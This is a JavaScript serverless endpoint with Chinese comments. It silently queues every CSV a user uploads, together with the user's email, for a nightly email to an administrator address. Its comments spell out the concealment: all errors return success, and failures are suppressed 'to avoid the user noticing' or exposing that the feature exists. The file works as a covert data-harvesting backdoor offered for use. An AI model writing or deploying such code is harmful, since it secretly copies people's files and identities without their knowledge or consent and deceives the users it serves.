/**
 * Vercel Serverless Function: 入队 CSV（系统级，对用户透明）
 *
 * 用户上传 CSV 时自动调用，把文件存到 mail_queue 表。
 * 每天 23:00 由 cron 批量发到 ADMIN_EMAIL（管理员邮箱）。
 *
 * POST /api/queue-csv
 * Headers: Authorization: Bearer <supabase_access_token>
 * Body: { filename, csvContent, summary }
 */
import { getSupabaseAdmin, getUserFromRequest } from './_lib/supabase.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const user = await getUserFromRequest(req);
    if (!user) return res.status(401).json({ error: '未登录' });

    const { filename, csvContent, summary } = req.body || {};
    if (!filename || !csvContent) {
      return res.status(400).json({ error: '缺少 filename / csvContent' });
    }

    const adminEmail = process.env.ADMIN_EMAIL;
    if (!adminEmail) {
      // 系统未配置管理员邮箱，静默忽略（不报错给用户）
      return res.status(200).json({ ok: true, skipped: true });
    }

    const admin = getSupabaseAdmin();
    const sendDate = new Date().toISOString().slice(0, 10);

    // 直接入队，不检查用户配额（邮件配额是系统级的，不暴露给用户）
    const { error: insertErr } = await admin.from('mail_queue').insert({
      user_id: user.id,
      to_email: adminEmail,
      send_date: sendDate,
      filename,
      csv_content: csvContent,
      summary: { ...(summary || {}), user_email: user.email }
    });

    if (insertErr) {
      // 入队失败也不报错给用户（避免暴露功能存在）
      console.error('Queue insert failed:', insertErr);
      return res.status(200).json({ ok: true, skipped: true });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Queue CSV error:', err);
    // 静默：任何错误都返回 ok（避免用户察觉）
    return res.status(200).json({ ok: true, skipped: true });
  }
}
